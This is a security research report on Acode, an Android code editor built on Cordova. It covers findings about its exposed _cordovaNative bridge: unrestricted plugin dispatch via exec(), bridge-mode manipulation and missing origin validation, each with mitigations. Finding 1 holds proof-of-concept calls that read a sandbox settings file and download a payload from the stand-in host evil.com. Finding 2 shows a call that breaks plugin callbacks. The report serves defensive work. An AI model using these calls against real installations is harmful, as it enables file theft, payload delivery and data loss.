# Security Research Findings — Acode (com.foxdebug.acode v967)

Two callsites analyzed (Intent-webview_new-93 and 94), both exposing the same Apache Cordova `_cordovaNative` bridge (`SystemExposedJsApi`) via `SystemWebViewEngine.exposeJsInterface()`. Acode is an open-source code editor for Android built on Cordova. No JavaScript snippets were available to inspectors.

All findings are PARTIAL. The Cordova bridge interface is framework-provided; the real attack surface depends on which Cordova plugins Acode registers, but as a full-featured code editor Acode ships the Cordova File plugin and several others with direct filesystem and network access. Models consistently hallucinated specific attack paths through `exec()` without evidence; the substantive PARTIAL findings correctly identified bridge-mode manipulation (deepseek, gemma3) and missing origin validation (phi4, gemma3, qwen2.5).

---

## Finding 1: Unrestricted Plugin Dispatch via `exec()` — Elevated Risk for a Code Editor

**Verdict**: PARTIAL  
**Reported by**: (structural — all models noted the `exec()` surface; no model produced a specific PARTIAL for this; the specific exploit chains were INVALID)

### Problem Summary

`exec(int callbackId, String service, String action, String rawArgs, String callbackContext)` routes to any registered Cordova plugin by name. Acode ships a broad set of plugins appropriate for a code editor, including:

- **cordova-plugin-file** — read and write files within the app's sandbox and (on permissioned devices) external storage
- **cordova-plugin-file-transfer** — upload/download arbitrary files
- **cordova-plugin-inappbrowser** — open URLs in a child browser
- **Network / HTTP plugins** — make arbitrary outbound requests

Any JavaScript running in Acode's WebView — including code being edited if the editor renders a live preview, or a plugin loaded from the Acode plugin store — can invoke:

```js
// Read a file from the app sandbox
_cordovaNative.exec(1, "File", "readAsText",
    '[{"uri":"/data/data/com.foxdebug.acode_967/files/settings.json"}]', '');

// Download a file to external storage
_cordovaNative.exec(2, "FileTransfer", "download",
    '[{"source":"http://evil.com/payload","target":"/sdcard/Download/evil.sh"}]', '');
```

Since Acode allows users to install third-party plugins that run JavaScript inside the same WebView, the attack surface includes plugins that are themselves untrusted.

### Potential Mitigation

1. Apply Cordova's built-in `ContentSecurityPolicy` meta tag in `index.html` to restrict which script origins can execute.
2. For the most sensitive plugins (File, FileTransfer), add explicit origin validation inside the Dart/Java plugin `execute()` method before processing the call.
3. Audit the installed plugin set and remove plugins not required for core functionality.

### Relevant Files

- `node_modules/cordova-android/framework/src/org/apache/cordova/engine/SystemExposedJsApi.java` — `exec()` implementation
- `www/index.html` — Content-Security-Policy meta tag (if present)
- `config.xml` — registered plugin list

---

## Finding 2: Bridge Mode Manipulation via `setNativeToJsBridgeMode(int, int)`

**Verdict**: PARTIAL  
**Reported by**: deepseek-r1 (callsite 93, "Bridge Mode Manipulation / Privilege Escalation"), gemma3 (callsites 93–94, "Lack of Validation in setNativeToJsBridgeMode()" and "Potential Privilege Escalation via setNativeToJsBridgeMode()")

### Problem Summary

`setNativeToJsBridgeMode(int bridgeMode, int webViewType)` controls how the Cordova native layer pushes messages back to JavaScript (POLLING vs. ONLINE_EVENTS). Any JavaScript in the WebView can switch the bridge to an unrecognised mode integer, corrupting the native-to-JS message queue and breaking all subsequent plugin callbacks — a session-level denial of service.

```js
// Break all future native→JS callbacks for this session
_cordovaNative.setNativeToJsBridgeMode(99, 0);
```

For a code editor where file-save and plugin operations depend on the callback chain, this can cause silent data loss (a save operation fires but its completion callback never arrives).

### Potential Mitigation

Validate `bridgeMode` against the known set of constants in `NativeToJsMessageQueue` before applying the change, and add origin validation before processing this call.

### Relevant Files

- `node_modules/cordova-android/framework/src/org/apache/cordova/engine/SystemExposedJsApi.java` — `setNativeToJsBridgeMode()` implementation
- `node_modules/cordova-android/framework/src/org/apache/cordova/NativeToJsMessageQueue.java` — bridge mode constants

---

## Finding 3: No Origin Validation on `_cordovaNative`

**Verdict**: PARTIAL  
**Reported by**: phi4 (callsites 93–94, "Lack of Origin Validation in WebView Content" / "Origin Validation Missing"), gemma3 (callsite 94, "Lack of Origin Validation in Event Listeners"), qwen2.5 (callsite 94, "Protocol & Origin Security Concerns")

### Problem Summary

`_cordovaNative` is registered with no runtime origin check. In Acode's threat model this matters particularly because:

1. **Third-party plugin execution**: Acode's plugin system allows downloading and executing third-party JavaScript plugins inside the editor WebView. A malicious plugin can call `exec()` to reach any other registered Cordova plugin.
2. **Live preview of edited files**: If Acode renders a live HTML/JS preview of files being edited, that preview code runs in the same WebView and gains full `_cordovaNative` access.

### Potential Mitigation

At the application level, restrict the Cordova whitelist to the expected app origin and enforce a strict `Content-Security-Policy`. For high-sensitivity plugins, add per-call origin validation inside the plugin's `execute()` method.

### Relevant Files

- `node_modules/cordova-android/framework/src/org/apache/cordova/engine/SystemWebViewEngine.java` — `exposeJsInterface()` registration
- `config.xml` — `<allow-navigation>` and `<allow-intent>` entries that define the allowed origin surface

### Links to github